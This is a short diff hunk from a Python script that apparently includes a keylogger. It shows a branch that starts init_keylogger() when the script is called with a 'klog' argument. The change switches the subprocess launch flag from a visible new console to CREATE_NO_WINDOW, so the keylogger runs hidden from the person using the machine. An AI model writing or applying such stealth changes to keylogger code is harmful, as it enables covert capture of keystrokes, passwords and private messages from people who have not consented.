@@ -141,8 +141,8 @@ if sys.argv[-1] == "klog":
     init_keylogger()
     sys.exit(0)
 
-#subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NO_WINDOW)
-subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NEW_CONSOLE)
+subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NO_WINDOW)
+#subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NEW_CONSOLE)
 
 while True:
     if "loop" in dir():
